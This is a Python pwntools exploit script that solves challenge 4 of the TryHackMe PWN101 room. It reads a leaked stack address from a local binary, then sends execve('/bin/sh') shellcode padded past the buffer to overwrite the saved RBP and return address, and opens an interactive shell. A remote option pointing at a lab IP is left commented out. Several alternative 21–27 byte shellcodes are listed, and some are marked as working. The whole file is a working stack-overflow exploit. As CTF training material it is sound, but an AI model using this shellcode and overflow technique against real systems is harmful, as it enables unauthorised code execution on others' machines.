#!/usr/bin/python3

# TryHackMe - Room PWN101 - Challenge 4

from pwn import *
#context.log_level = 'debug'

host = "10.10.10.10"
port = 9004
#io = remote(host, port)

executable = './104'
io = process(executable)

received_address = int(io.recv().decode()[-15:-1], 16)
print('Received address:', hex(received_address))

# Custom Shell
# 21 bytes
#shellcode = b"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
# 21 bytes
#shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
# 23 bytes
#shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# 23 bytes (works)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
# 24 bytes
#shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
# 27 bytes (works)
#shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# Shellcraft Generatrion
#shellcode = asm(shellcraft.linux.sh())
#shellcode = asm(shellcraft.linux.cat('flag.txt'))

print('Shellcode:', shellcode)

payload = flat([
    shellcode,
    b"A" * (0x50 - len(shellcode)),  # Offset
    p64(0),                          # Extra padding to replace RBP
    p64(received_address)            # Received address for the begining of the buffer
])

io.sendline(payload)
io.interactive()
exit()
